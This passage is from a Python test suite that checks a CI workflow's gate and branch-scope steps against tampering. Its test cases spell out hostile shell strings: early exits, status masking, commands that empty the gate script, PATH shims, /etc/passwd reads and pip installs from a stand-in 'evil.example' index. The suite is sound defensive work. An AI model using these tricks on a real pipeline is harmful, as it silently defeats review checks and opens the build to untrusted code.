    HANDLER = 'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::gate failed"; exit 1; }'
    check("it accepts the gate as written, and a re-raising handler after it",
          invoking_segment(HANDLER, "scripts/ai/pr_gate.py") == GATE_CMD)
    NOTICE = 'echo "::notice::selection was --all"'
    check("a trailing notice annotation is accepted, which is the other edit this repo documents as "
          "correct and which nothing used to assert",
          annotation_only(NOTICE) and pure_echo(NOTICE)
          and not foreign_commands(as_step("set -euo pipefail", NOTICE)), NOTICE)
    check("while a state-changing workflow command in the same position is not",
          not annotation_only('echo "::set-output name=ref::HEAD"'))
    check("the annotation rule admits that handler's payload, so the documented correct edit still "
          "passes every rule that reads it",
          all(annotation_only(seg) for seg, _ in parts(HANDLER))
          and not foreign_commands(as_step("set -euo pipefail", HANDLER)), HANDLER)
    check("and the checker with --no-fetch moved onto the invocation",
          argv_in(invoking_segment('python scripts/ai/check_branch_scope.py "$@" --no-fetch',
                                   "scripts/ai/check_branch_scope.py"),
                  (SCOPE_CMD + " --no-fetch",)))
    check("those forms accept the three the workflow actually builds argv with",
          not foreign_commands(as_step('set -- --base "origin/${BASE_REF}" --head "pr-${PR}"',
                                       'set -- --pr "${PR}"', 'set -- "$@" --no-fetch')))
    for label, snippet in (("an assignment prefixing a command, which defines a shim",
                            "code=0 eval 'python() { return 0; }'"),
                           ("an assignment to a name this workflow does not use", "PATH=/tmp/shim"),
                           ("a permitted name given an unexpected value", 'SEL="--base HEAD"')):
        check(f"the pinned assignment forms reject {label}",
              foreign_commands(as_step("set -euo pipefail", snippet)), snippet)
    check("those forms accept the three the retry loop needs, in either arithmetic spelling",
          not foreign_commands(as_step("attempt=1", "code=$?", "attempt=$((attempt + 1))",
                                      "attempt=$((attempt+1))")))
    for label, snippet in (("a redirection that truncates the script about to run",
                            "echo -n > scripts/ai/pr_gate.py"),
                           ("a command substitution hidden inside a permitted echo",
                            'echo "$(printf %s x > scripts/ai/pr_gate.py)"'),
                           ("a heredoc that turns the next line into data",
                            "echo disabled <<'echo'"),
                           ("a file read into a permitted command", "echo x < /etc/passwd"),
                           ("a backtick substitution", "echo `id`")):
        check(f"the rewrite rule rejects {label}",
              rewrites(as_step("set -euo pipefail", snippet)), snippet)
    check("that rule accepts the retry loop's arithmetic, which is not a substitution",
          not rewrites(as_step("sleep $((attempt * 15))", "attempt=$((attempt + 1))")))
    check("that rule accepts the gate step as written",
          not foreign_commands(as_step("set -euo pipefail",
                                       "python scripts/ai/pr_gate.py ${SEL}")))
    check("that rule accepts a re-raising handler, whose pieces are `echo` and `exit`",
          not foreign_commands(as_step(
              'python scripts/ai/pr_gate.py ${SEL} || { echo "gate failed"; exit 1; }')))
    check("that rule accepts the retry loop's arithmetic and its `set --` argument building",
          not foreign_commands(as_step("attempt=1", "while :", "do", "set +e",
                                       'python scripts/ai/check_branch_scope.py "$@"',
                                       "code=$?", "set -e",
                                       'if [ "$code" -ne 2 ]; then exit "$code"; fi',
                                       "sleep $((attempt * 15))", "attempt=$((attempt + 1))",
                                       "done")))
    # Quote-awareness is what makes the rule above usable: both steps echo strings containing `;`,
    # and a naive split turns the text after it into a segment that runs a command named `STACKED`.
    check("a separator inside a quoted string is text, not a segment boundary",
          len(parts('echo "Fork PR: comparing refs; STACKED needs --pr and is off."')) == 1)
    check("and a real separator outside quotes still splits",
          len(parts('echo "a; b"; exit 0')) == 2)
    check("the step-reachability rule rejects an early exit on its own line",
          escapes_early(as_step("set -euo pipefail", "exit 0",
                               "python scripts/ai/pr_gate.py ${SEL}")))
    check("that rule accepts an exit nested in a block, which is conditional on it",
          not escapes_early({"run": "\n".join((" " * 10 + 'if [ "$x" = 1 ]; then',
                                              " " * 12 + "exit 2",
                                              " " * 10 + "fi"))}))
    check("that rule accepts a single-line guarded exit, which opens with `if`",
          not escapes_early(as_step('if [ "$c" -ne 2 ]; then exit "$c"; fi')))
    # The other side of that boundary. Both readers of nesting treated "this line carries an opener" as
    # "everything on this line is inside the block", which is false once the block *closes* on the same
    # line: the terminator after the `fi` is top-level, and the step is gone before the gate runs.
    # Verified — each of these under `set -euo pipefail` exits 0 without reaching the next command.
    # `terminates()` refused to read them for a second reason (it saw an opener), so both readers agreed
    # and both were wrong, which is why neither the nesting probes nor the reachability probes caught it.
    for label, snippet in (("an exit after a one-line if that closes on it",
                            'if [ -n "${HOME}" ]; then :; fi; exit 0'),
                           ("an exit after a one-line while that closes on it",
                            "while false; do :; done; exit 0"),
                           ("an exit after a one-line case that closes on it",
                            'case "${X}" in *) :;; esac; exit 0')):
        check(f"the reachability rule rejects {label}",
              escapes_early(as_step("set -euo pipefail", snippet,
                                    "python scripts/ai/pr_gate.py ${SEL}")),
              snippet)
    # And the boundary holds in the guarded direction: same one-line shapes with the terminator *inside*
    # the block are genuinely conditional and stay accepted. Reading the whole line instead of the part
    # after the closer called four of these unconditional.
    for snippet in ('if [ -f x ]; then exit 0; fi',
                    'if [ -d x ]; then exit 0; fi',
                    'while [ -n "${X:-}" ]; do exit 0; done'):
        check(f"and still accepts the guarded exit inside {snippet!r}",
              not escapes_early(as_step("set -euo pipefail", snippet,
                                        "python scripts/ai/pr_gate.py ${SEL}")),
              snippet)
    # The three shapes the line-prefix reading missed. Each was a live false green in the branch-scope
    # step: every command is in `permitted()`'s vocabulary, the invocation and its `code=$?` are
    # untouched, and the shell is gone before either runs.
    for label, snippet in (("an exit after a harmless command on one line", "true; exit 0"),
                           ("an exit reached through a no-op", ": && exit 0"),
                           ("an exit guarded by a condition that always holds",
                            "[ 1 = 1 ] && exit 0"),
                           # Openers whose condition is a no-op. Exempting on the keyword alone let
                           # these through: as unconditional as a bare `exit 0`, spelled as a block.
                           ("an exit under an opener with no real test", "if : ; then exit 0; fi"),
                           ("an exit under a loop with no real test",
                            "while :; do exit 0; done")):
        check(f"that rule rejects {label}", escapes_early(as_step(snippet)), snippet)
    for label, snippet in (("an always-true test, which conditions nothing",
                            "if [ 1 = 1 ]; then exit 0; fi"),
                           ("a word that merely looks like a test",
                            "if grep -q test x; then exit 0; fi")):
        check(f"the reachability rule rejects an exit under {label}",
              escapes_early(as_step(snippet)), snippet)
    # Every row above spells its block on one line, and the one multi-line row in this section is an
    # *accept* — so no row distinguished the two, and the whole decidedness apparatus turned out to be
    # reachable in one spelling only. Multi-line is what the real workflow uses.
    for label, lines in (("an exit inside a multi-line opener with no real test",
                          ("if :; then", "  exit 0", "fi")),
                         ("the same, spelled with true",
                          ("if true; then", "  exit 0", "fi")),
                         ("an exit inside a multi-line always-true test",
                          ("if [ 1 = 1 ]; then", "  exit 0", "fi")),
                         ("an exit inside a multi-line loop with no real test",
                          ("while :; do", "  exit 0", "done")),
                         # A `case` opens a block but carries no test, so the body read as guarded
                         # whatever the subject was.
                         ("an exit inside a case on a constant",
                          ("case true in", "  *) exit 0;;", "esac")),
                         ("an exit in the else-branch of a decided test",
                          ("if [ 1 = 2 ]; then", "  true", "else", "  exit 0", "fi"))):
        check(f"that rule rejects {label}", escapes_early(as_step(*lines)), lines)
    for label, lines in (("an exit under a multi-line test naming a variable",
                          ('if [ -z "${BASE_REF:-}" ]; then', "  exit 0", "fi")),
                         ("an exit in the else-branch of a test naming a variable",
                          ('if [ "$code" -ne 2 ]; then', "  true", "else", "  exit 0", "fi")),
                         ("an exit inside a case on a variable",
                          ('case "${CROSS}" in', "  true) exit 0;;", "esac"))):
        check(f"and accepts {label}, whose outcome the shell decides", not escapes_early(as_step(*lines)),
              lines)
    for label, snippet, early in (
            ("a handler that re-raises the failure it caught",
             'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 1; }', False),
            ("a handler that re-raises the captured status",
             'python scripts/ai/pr_gate.py ${SEL} || { echo "x"; exit "$code"; }', False),
            ("a handler that replaces the failure with success",
             'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 0; }', True),
            ("a bare conditional exit 0", "python scripts/ai/pr_gate.py ${SEL} || exit 0", True),
            # `$?` is the status of whatever ran last, so it hands on a failure only after `||`. Read
            # as re-raising after `&&` too, `sleep 0 && exit $?` ended a step clean before its checker
            # ran, with every rule green — a live false green a review found in the real workflow.
            ("the captured status re-raised after a success",
             "sleep 0 && exit $?", True),
            ("the captured status re-raised after a failure",
             "python scripts/ai/pr_gate.py ${SEL} || exit $?", False),
            # bash truncates an exit status to 8 bits, so these two exit 0.
            ("a handler exiting a status bash truncates to zero",
             'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 256; }', True),
            ("a handler exiting a status that survives truncation",
             'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 257; }', False),
            # Decided tests, whatever their arity: `!` inverts one and `-a`/`-o` join two. Every branch
            # of `decided` fell through to "real condition" past three operands, so both of these
            # guarded an unconditional exit that read as conditional.
            ("an exit under an always-true negated test",
             "if [ ! 1 = 2 ]; then exit 0; fi", True),
            ("an exit under an always-true conjunction",
             "if [ 1 = 1 -a 1 = 1 ]; then exit 0; fi", True),
            ("an exit under an always-false disjunction",
             "if [ 1 = 2 -o 1 = 2 ]; then exit 0; fi", True),
            # …but a *file* test is a runtime probe, not a literal comparison, so an early-out guarded
            # by one is a real condition. Called decided by operand count alone, a legitimate guard was
            # reported as an unconditional exit.
            ("an exit under a file test", "if [ -f /some/marker ]; then exit 0; fi", False),
            ("an exit under a directory test", "if [ -d /some/dir ]; then exit 0; fi", False),
            # `after_failure` used to be latched over every operator on the line rather than read off
            # the one beside the terminator, so putting a `||` earlier in the chain flipped the sense
            # of a following `&&` and defeated the `&& exit $?` control four rows up. Verified in bash.
            ("the captured status re-raised after a success reached through an earlier failure",
             "sleep 0 || true && exit $?", True),
            # …and the durable capture is the opposite case: `$code` holds the verdict however far it
            # sits from the invocation, so the real workflow's guarded propagation stays reachable.
            ("the durable capture re-raised after an intervening command",
             'python scripts/ai/pr_gate.py ${SEL} || { echo "x"; echo "y"; exit "$code"; }', False)):
        check(f"the reachability rule reads {label} as {'an early exit' if early else 'reachable'}",
              bool(escapes_early(as_step(snippet))) is early, snippet)
    check("and still accepts the retry loop's real guarded exit",
          not escapes_early(as_step('if [ "$code" -ne 2 ]; then exit "$code"; fi')))
    # `after` makes "early" mean something. Without it the rule refused a terminator that hands on a
    # verdict the invocation had already produced; with it, position is read — and the exemption is
    # confined to terminators the invocation *precedes*, so the shapes this rule exists to catch are
    # untouched.
    GATE = "scripts/ai/pr_gate.py"
    for label, snippet, early in (
            ("a sequential re-raise on the invocation's own line",
             "python scripts/ai/pr_gate.py ${SEL}; exit $?", False),
            ("an exit on a later line, unreachable under set -e",
             "python scripts/ai/pr_gate.py ${SEL}\nexit 0", False),
            # The two that must stay refused: before the invocation, position earns nothing.
            ("an exit on an earlier line", "exit 0\npython scripts/ai/pr_gate.py ${SEL}", True),
            ("an exit earlier on the same line",
             "exit 0; python scripts/ai/pr_gate.py ${SEL}", True),
            # The exemption's predicate was handed one segment at a time, so it could not see the
            # operator that decides whether that segment runs — the one thing it was swapped in to
            # read. An invocation bash skips disarmed the terminator behind it.
            ("an invocation bash skips, disarming the terminator behind it",
             "true || python scripts/ai/pr_gate.py ${SEL}; exit 0", True),
            ("the same through a succeeding &&-predecessor",
             "false && python scripts/ai/pr_gate.py ${SEL}; exit 0", True),
            # The idiom that must keep working: `;` does not make the invocation skippable.
            ("a cleanup that cannot fail, then the real invocation",
             "rm -f gate.log || true; python scripts/ai/pr_gate.py ${SEL}; exit $?", False),
            # All four rows above used the real `${SEL}` argv, so the exemption's predicate was never
            # asked about an invocation that produces no verdict — and it was `executes`, which accepts
            # exactly those. A `--help` line disarmed every terminator below it, which is how
            # `check_branch_scope.py --help` + `exit 0` passed 503/503 while the step printed usage.
            ("a --list mention then an exit",
             "python scripts/ai/pr_gate.py --list\nexit 0", True),
            ("a --help mention then an exit",
             "python scripts/ai/pr_gate.py --help\nexit 0", True),
            ("a --requirements mention then an exit",
             "python scripts/ai/pr_gate.py --requirements ${SEL}\nexit 0", True),
            # A skipped invocation is the other thing `foreground` asks and `executes` does not.
            ("an invocation bash skips, then an exit",
             "false && python scripts/ai/pr_gate.py ${SEL}\nexit 0", True)):
        check(f"the positional reading reads {label} as {'an early exit' if early else 'reachable'}",
              bool(escapes_early(as_step(*snippet.split("\n")), after=GATE)) is early, snippet)
    check("the annotation exception admits the brace-group handler this file calls a correct edit",
          annotation_only('{ echo "::error::selection was empty"'))
    check("and still refuses a state-changing workflow command however it is wrapped",
          not annotation_only('{ echo "::set-output name=ref::HEAD"'))
    check("masking is judged on what follows the command, not the whole line, so a cleanup "
          "before the real call is still accepted",
          executes("          rm -f gate.log || true; python scripts/ai/pr_gate.py ${SEL}",
                   "scripts/ai/pr_gate.py"))
    # Four `||` rows and nothing else, which is exactly why both non-`||` branches of
    # `tail_preserves_status` shipped with a `return True` that skipped the walk. The last three rows
    # are those branches, all three confirmed to exit 0 in bash on a failing gate.
    for mask in ("|| echo warn", "|| /bin/true", "|| command true", "|| builtin true",
                 # `&&` skips its own branch on failure, but a command that is not last in an `&&`
                 # list is exempt from `set -e`, so the shell runs on and reaches the `;`.
                 "&& true; exit 0", "&& : ; exit 0",
                 # A pipeline keeps its status under pipefail; the `|| true` after it does not.
                 "| : || true"):
        check(f"masking with `{mask}` is rejected",
              not executes(f"          python scripts/ai/pr_gate.py ${{SEL}} {mask}",
                           "scripts/ai/pr_gate.py"))
    # ...and the benign forms of those same two operators must keep passing, or the fix above is just
    # a stricter rule that fires on correct code.
    # `| tee gate.log` was here, and the tail predicate does accept it — but the segment whitelist
    # refuses `tee` as a write channel, so listing it as a benign form invited someone to widen the
    # whitelist to match. The two rules disagreeing is the point: `tee` is refused, deliberately.
    for fine in ("&& true", "&& echo ok", "| cat", "&& exit $?", "; exit $?"):
        check(f"`{fine}` after the invocation is still accepted",
              executes(f"          python scripts/ai/pr_gate.py ${{SEL}} {fine}",
                       "scripts/ai/pr_gate.py"), fine)
    check("a handler that re-raises is not masking",
          executes('          python scripts/ai/pr_gate.py ${SEL} || { echo "::error::"; exit 1; }',
                   "scripts/ai/pr_gate.py"))
    # The retry loop is only sound because of the exit contract: 2 is a tool error and worth
    # another attempt, 0 and 1 are verdicts and final. Widening that comparison would turn three
    # attempts into three chances to miss a real FOREIGN/STACKED finding, so the shape is pinned.
    # Unconditional, which it was not: guarding this with `if "while" in shell` made the rule
    # conditional on the very token it protects, so replacing the loop with a one-shot
    # `set +e; …; code=$?` that never exits with `$code` skipped *both* checks. That mutation was
    # caught only by the total-count invariant — and its failure message says "update EXPECTED
    # deliberately", so the natural response to it merges the defect. A guard that disappears with
    # the thing it guards is worse than no guard, because the suite still reports success.
    check("the checker's exit code is what the step exits with, whatever the retry shape",
          re.search(r'if \[ "\$code" -ne 2 \]; then exit "\$code"; fi', shell), shell)
    check("that rule rejects a loop that retries a verdict",
          not re.search(r'if \[ "\$code" -ne 2 \]; then exit "\$code"; fi',
                        'if [ "$code" -eq 0 ]; then exit "$code"; fi'))
    check("that rule rejects a one-shot that captures the code and never exits with it",
          not re.search(r'if \[ "\$code" -ne 2 \]; then exit "\$code"; fi',
                        'set +e\npython check.py "$@"\ncode=$?\nset -e\necho "exited ${code}"'))

    # Every pip install must come from --requirements. Checking for two literal pin spellings
    # missed `cumulusci~=4.8.1` and `setuptools<77`; naming the operators would still miss an
    # unpinned `pip install requests`. So the rule inverts: an install line may reference
    # ${reqs} or upgrade pip, and nothing else. It needs no list of packages and so cannot
    # drift from PINS/CO_REQUIRES/deps as those change.
    # Third instance of the substring-filter shape in this file (after `ref_lines` and `sel_lines`):
    # keyed on the text `pip install`, it fired on `echo "::group::pip install"`, which installs
    # nothing, and told the reader they had restated a pin. Read per segment, and only when the
    # segment's command *is* pip.
    def runs_pip(seg):
        """Is this segment a pip invocation, in any spelling that reaches pip?

        Narrowed to bare `python -m pip` and `pip`, this missed `python3 -m pip`, `pip3`, and either
        behind a block keyword (`if …; then pip install …`). Those were still refused — but by the
        vocabulary rule, whose message is about shimming the interpreter, not about a dependency
        restated in place of `--requirements`. A rule that hands its diagnosis to another rule reads
        as a bug in that other rule.
        """
        return pip_words(seg) is not None

    def pip_words(seg, strict=False):
        """The argv after the pip executable, or None if this segment does not reach pip.

        One reader for both questions. `permitted_job` had its own, narrower notion of "this is pip" —
        `python -m pip` and `python3 -m pip` only — so `pip install ${reqs}`, `pip3 …`, `python3.13 -m
        pip …` and `/usr/bin/pip …` fell through to `return False` and were refused as *foreign
        commands*, with a message naming the wrong problem. Sixth instance of the shape this file keeps
        finding: a helper that normalises a spelling and a comparison beside it that does not.

        `strict` is what keeps the merge from being a loosening. The detecting caller wants every
        spelling that *reaches* pip, wrappers included, so it can refuse a restated dependency;
        the authorising caller must not accept those wrappers at all — `sudo pip install …` reaches pip
        and is not a permitted form, and `./pip` would run an executable out of the checkout. In strict
        mode the executable must be a bare, unwrapped name.
        """
        words = seg.split()
        while words and words[0] in KEYWORDS:
            words = words[1:]
        if not strict:
            # `VAR=1 pip …`, `sudo pip …` and `env pip …` all reach pip; skipping those prefixes keeps
            # the diagnosis here rather than handing it to the vocabulary rule.
            while words and (re.match(r"^[A-Za-z_]\w*=", words[0])
                             or words[0] in ("sudo", "env")
                             or (words[0].startswith("-") and len(words) > 1)):
                words = words[1:]
        if not words:
            return None
        if strict and "/" in words[0]:
            return None
        # Version-suffixed and absolute spellings reach pip too: `pip3.13`, `/usr/bin/pip`,
        # `python3.13 -m pip`. Matched on the basename with any version suffix stripped, because
        # enumerating `python3` and stopping there is what left `python3.13` to another rule.
        exe = re.sub(r"3(\.\d+)*$", "", words[0].rsplit("/", 1)[-1])
        if exe == "pip":
            return words[1:]
        if exe == "python":
            if words[1:3] == ["-m", "pip"]:
                return words[3:]
            if words[1:2] == ["-mpip"]:
                return words[2:]
        return None

    for spelling in ("pip install requests", "pip3 install requests",
                     "python -m pip install requests", "python3 -m pip install requests",
                     "then pip install requests", "pip3.13 install requests",
                     "python3.13 -m pip install requests", "/usr/bin/pip install requests",
                     "python -mpip install requests", "sudo pip install requests",
                     "env pip install requests", "PIP_NO_INPUT=1 pip install requests",
                     # The assignment-prefix strip applied the *basename* logic meant for
                     # `/usr/bin/pip` to the assignment as well, so any value containing a slash took
                     # its last path segment — where the `=` no longer is — and the prefix was never
                     # skipped. `sudo -H` and `env -i` stopped the loop for the same reason. All were
                     # refused by another rule, under another rule's message.
                     "PATH=/tmp/shim pip install requests",
                     "PIP_INDEX_URL=https://example.invalid/simple pip install requests",
                     "sudo -H pip install requests", "env -i pip install requests"):
        check(f"the restated-dependency rule sees {spelling!r} as a pip invocation",
              runs_pip(spelling), spelling)
    check("and does not see a log line that merely names it",
          not runs_pip('echo "::group::pip install"'))
    # `pip2` is Python 2's installer and `./pip3.13` can be a checked-in script; a blanket `[\d.]+$`
    # strip turned both into the real pip.
    check("and does not read pip2 as a spelling of pip3", not runs_pip("pip2 install requests"))
    # `${reqs}`, not the bare word `reqs`: keyed on the substring, `pip install evil-reqs` read as
    # an install that came from --requirements. And the self-upgrade exemption is no longer anchored
    # at end-of-segment, which rejected `pip install --upgrade pip --quiet` — a correct edit that
    # cannot hide anything, since pip's exit code is unchanged.
    def self_upgrade(seg):
        """Is this the pip self-upgrade, however its flags are ordered?

        Matched as `pip install --upgrade pip`, adjacency and all, this rejected `-U pip`,
        `--quiet --upgrade pip` and `--upgrade --quiet pip` — the same command with its flags moved —
        and then reported them as a dependency restated in place of `--requirements`. Asked as an argv
        question, the way `git_form_ok` already asks it: the only package named is `pip`, and an
        upgrade flag is present somewhere.
        """
        words = seg.split()
        if "install" not in words or not runs_pip(seg):
            return False
        tail, packages, upgrading = words[words.index("install") + 1:], [], False
        i = 0
        while i < len(tail):
            word = tail[i]
            if upgrade_flag(word):
                upgrading = True
            elif PIP_OPTS.get(word.partition("=")[0]) and "=" not in word:
                i += 1  # skip the option's value, which is not a package
            elif not word.startswith("-"):
                packages.append(word)
            i += 1
        return upgrading and packages == ["pip"]
    restated = [seg.strip() for ln in run_contents(wf) for seg, _ in parts(ln)
                if runs_pip(seg) and "install" in seg
                and not re.search(r"\$\{?reqs\}?", seg)
                and not self_upgrade(seg)]
    check("every dependency install comes from --requirements rather than being restated",
          not restated, restated)
    check("the gate is asked what to install in the first place",
          [ln for ln in run_contents(wf) if "--requirements" in ln], run_contents(wf))
    def restates(seg):
        return (runs_pip(seg) and "install" in seg and not re.search(r"\$\{?reqs\}?", seg)
                and not self_upgrade(seg))

    for spelling in ('pip install "cumulusci~=4.8.1"', "pip install setuptools<77",
                     "pip install requests", "pip install evil-reqs",
                     "pip3.13 install requests"):
        check(f"that rule catches a restated dependency: {spelling}", restates(spelling), spelling)
    for spelling in ('pip install -r "${reqs}"', "pip install --upgrade pip",
                     "pip install --upgrade pip --quiet", 'echo "::group::pip install"'):
        check(f"and accepts {spelling!r}, which restates nothing", not restates(spelling), spelling)

    # fetch-depth: 0 is load-bearing, not hygiene: past a shallow boundary `git diff base...HEAD`
    # exits 128 with "no merge base", which `git()` turns into exit 2 — a red tool error, not a
    # silent empty selection. Verified against a `--depth 1` clone. What the pin buys is a *usable*
    # diff; the danger it removes is a broken job, not a false green (the false green is one step
    # further on, in `--no-fetch`, which is why the two are asserted together below).
    # Read from the step's `with:` rather than matched as a substring —
    # `fetch-depth: 1 # was fetch-depth: 0` satisfied the substring form.
    checkouts = [s for s in (gate_job.get("steps") or [])
                 if str(s.get("uses", "")).startswith("actions/checkout")]
    depths = [str((s.get("with") or {}).get("fetch-depth")) for s in checkouts]
    check("history is fetched in full, so the merge base resolves", depths == ["0"], depths)
    # And the coupling, asserted rather than assumed: passing --no-fetch to the checker is only safe
    # because *this job* fetched full history moments earlier. Two settings in different steps, one
    # guarantee — if a future edit shallows the clone, the checker would compare against a stale
    # base and report clean, which test_branch_scope.py calls "the trap" precisely because it is a
    # silent exit 0 rather than an error.
    if len(found_scope) == 1:
        check("the step that skips fetching is in the same job as the full-history checkout",
              bool(no_fetch) and depths == ["0"] and found_scope[0] in (gate_job.get("steps") or []),
              f"no_fetch={bool(no_fetch)}, depths={depths}")

    # Every step of the job shares one working tree, so pinning the two load-bearing steps says
    # nothing about a *third* step rewriting what they run. `echo 'import sys; sys.exit(0)' >
    # scripts/ai/pr_gate.py` in the install step leaves the pinned gate command exactly as written and
    # makes it a no-op; so do `sed -i`, a `cp` in a new step, and a `pip install` of a shim. This is
    # the round-6 mistake — a rule scoped to the thing it protects — one level up, at job scope. So the
    # job is whitelisted whole: which steps exist, which actions they may use, and what their shell may
    # say. Four of these five shapes survived the round-8 suite.
    JOB_STEPS = ["Checkout repository", "Set up Python", "Resolve the base ref",
                 "Install only what the selection needs", "Run the gate", "Branch scope"]
    JOB_USES = {"Checkout repository": "actions/checkout", "Set up Python": "actions/setup-python"}
    # Tag or full commit SHA, and the SHA is the one to prefer: pinning to a 40-hex commit is how a
    # movable tag stops being trusted, and the first version of this rule compared the whole `uses:`
    # string against `@v6` — refusing the stronger pin while admitting the weaker one, for a rule
    # whose stated purpose is that neither action can patch the tree.
    REF = re.compile(r"^(v\d+(?:\.\d+){0,2}|[0-9a-f]{40})$")

    def pinned_use(value):
        """Split a `uses:` into its action and whether the ref is a tag or a commit SHA.

        A `docker://` image or a `./local-action` reference has no repository ref at all, so calling
        one "pinned" because the text after `@` looked like a tag was a substring answer to a
        structural question. Only `owner/repo@ref` can be pinned this way; anything else is unpinned
        by construction, which is the safe direction for the rule that consumes this.
        """
        action, sep, ref = str(value).partition("@")
        repo_form = bool(re.fullmatch(r"[\w.-]+/[\w./-]+", action)) and not action.startswith((".", "/"))
        ref = re.sub(r"^refs/tags/", "", ref)
        return action, bool(sep) and repo_form and bool(REF.match(ref))
    # `python -m pip` cannot be left open the way `git fetch` can: `pip install ${reqs} evil-shim`
    # installs whatever it is told. There are no longer two pinned install *forms* — matching whole
    # commands as prefixes is what forced every option to the tail and let a reordered flag fall
    # through to a laxer reader — so this is just the payload the workflow installs. The self-upgrade
    # is decided inside `pip_install_ok`, not by a constant here.
    PIP_PAYLOAD = "${reqs}"
    JOB_ASSIGN = ALLOWED_ASSIGN + (
        'reqs="$(python scripts/ai/pr_gate.py --requirements ${SEL})"',)
    # A redirection is how a step writes to the checkout, so its *target* is the rule. The four
    # GitHub-provided files are how steps legitimately pass values on; /dev/null is how `git rev-parse
    # --verify` stays quiet.
    # Two of these are legitimate *targets* whose contents another rule then refuses: nothing may be
    # written to `$GITHUB_PATH` at all, and a `$GITHUB_STEP_SUMMARY` write must be display-only. This
    # list answers "may a step redirect here"; `ALLOWED_WRITES` answers "may it write that".
    # Stored unquoted and unbraced, because the *spelling* of a target is not the rule — the file it
    # names is. `hands_over()` accepts `$GITHUB_OUTPUT`, `${GITHUB_OUTPUT}` and the unquoted form (bash
    # treats all three identically, verified), and the suite asserts that acceptance; this list held
    # only the quoted-unquoted spelling, so brace-normalising an existing write — a formatting change,
    # and the workflow already writes `${BASE}` and `${SEL}` braced — failed under "every redirection
    # writes to a GitHub-provided file … never into the checkout". Eighth instance of one reader
    # normalising where another compares literally, so the normalisation is shared, not repeated.
    REDIR_TARGETS = ("$GITHUB_OUTPUT", "$GITHUB_ENV", "$GITHUB_PATH", "$GITHUB_STEP_SUMMARY",
                     "/dev/null")

    def redir_target(text):
        """A redirection target reduced to the file it names, so one spelling is compared."""
        return re.sub(r"\$\{(\w+)\}", r"$\1", text.strip().strip('"').strip("'"))

    def permitted_job(seg):
        """Wider than `permitted()` — the other two steps resolve a ref and install pins — but still a
        whitelist of forms, not of words."""
        # Only a *leading* `!` is negation; elsewhere it is a literal argument, and dropping it
        # everywhere made these "exact form" compares accept `git fetch ! --no-tags origin …`.
        words = seg.split()
        while words and words[0] == "!":
            words = words[1:]
        while words and (words[0] in KEYWORDS or words[0] in SHELL_OPENERS):
            words = words[1:]
        if not words:
            return True
        w0 = words[0]
        # Assignments are compared whole, and exactly one of them — `reqs="$(python … )"` — needs a
        # command substitution, so that branch is reached before this one. Everywhere else a
        # substitution is a way to smuggle an arbitrary command inside a permitted one:
        # `echo "$(cp /dev/null scripts/ai/pr_gate.py)"` passes as a harmless echo, writes no
        # redirection this suite can see, and empties the script the gate is about to run.
        # `$(( ))` arithmetic, which the retry loop needs, is not a substitution.
        # Process substitution runs a command too, and `echo <(cp /dev/null scripts/ai/pr_gate.py)`
        # names no `$(`. It happens to die on the workflow-wide refusal of `<`, whose stated purpose is
        # heredocs — an incidental kill, and the kind this file has twice mistaken for a rule. Named
        # here so this rule stands on its own.
        # Not quote-aware, unlike `tokens`: `echo 'literally $(cmd)'` is refused although bash expands
        # nothing. That is a false rejection of inert text and is the safe direction — making it
        # quote-aware would reopen the double-quoted case the rule exists for.
        if not re.match(r"^[A-Za-z_][A-Za-z_0-9]*=", w0):
            if re.search(r"\$\((?!\()|<\(", seg) or "`" in seg:
                return False
        if not annotation_only(seg):
            return False
        # Fifth and last copy of this vocabulary. SHELL_TEST_CMDS, not a fresh two-element tuple: this
        # one omitted `[[` and so rejected a respelling the other four had just been taught to accept —
        # which is what "sweep the class" means. `rg '"\["' on this file finds three sites: this
        # vocabulary and two unrelated ones (a YAML flow-style sniff, and the `[[`→`[` normalisation in
        # `canonical_shell`). The instruction used to say it should find only one, under the constant's
        # old name, which sent a reader to two sites they could not classify.
        if w0 in HARMLESS or w0 in TEST_CMDS:
            return True
        if w0 == "printf":
            return "-v" not in words
        if w0 == "set":
            return set_line_ok(words)
        if re.match(r"^[A-Za-z_][A-Za-z_0-9]*=", w0):
            return re.sub(r"\s+", "", seg) in [re.sub(r"\s+", "", f) for f in JOB_ASSIGN]
        if w0 == "git":
            # Pinning the subcommand and not its arguments left the base ref writable *locally*:
            # `git fetch . "+HEAD:refs/remotes/origin/${BASE_REF}"` moves origin/<base> onto the PR
            # head, after which the export below is honest about a ref that now means HEAD, and the
            # gate diffs HEAD against itself.
            return git_form_ok(" ".join(words))
        pip_tail = pip_words(seg, strict=True)
        if pip_tail is not None and not (len(words) > 1 and words[1] in SCRIPTS):
            return pip_install_ok(strip_redir(" ".join(["python", "-m", "pip"] + pip_tail)))
        if interpreter(w0) == "python":
            if len(words) > 1 and words[1] in SCRIPTS:
                return True
            # `interpreter()` normalises the *dispatch* above but the payload constant is a literal
            # beginning `python`, so `python3 -m pip install ${reqs}` — the spelling this repo's own
            # docs use everywhere else — was refused as a foreign command. Third instance of the same
            # shape: a helper that knows `python3` is `python`, and a comparison beside it that does
            # not. (`pip_install_ok` decides the rest; the old prefix-matched `PIP_FORMS` that this
            # comment used to describe is gone.)
            joined = strip_redir(" ".join(["python"] + words[1:]))
            return pip_install_ok(joined)
        return False

    def pip_install_ok(joined):
        """Is this the pinned install — one payload, and only options this workflow may carry?

        This was two readers of the same command, and the gap between them was an arbitrary package
        index in CI. `PIP_FORMS` were matched as literal *prefixes*, and anything that did not match
        fell through to `self_upgrade()` — a classifier written for the restated-dependency rule,
        which treats every unrecognised `-`-prefixed word as an ignorable option. So moving one flag
        defeated the prefix and landed in the lax reader:

            python -m pip install -U pip -ihttps://evil.example/simple   # 487/487 green

        `-U` breaks the `--upgrade pip` prefix; the glommed `-i` keeps the payload from looking like a
        bare package. Two characters from a spelling the suite's own table asserts is refused. Whoever
        writes the next classifier will reuse it as an authoriser too, so the fix is not to harden
        `self_upgrade` but to stop authorising anything with it: one function decides, and it decides
        on the property — the *packages* are exactly the pinned payload, and every option is in
        `PIP_OPTS`.

        Deciding on the property also fixed a false rejection the prefix match caused. Options were
        only ever legal *after* the payload, so `pip install --quiet ${reqs}` was refused as a foreign
        command while `pip install ${reqs} --quiet` passed — and the suite's own table asserted
        `--quiet` was allowed, which was true only in trailing position.
        """
        words = joined.split()
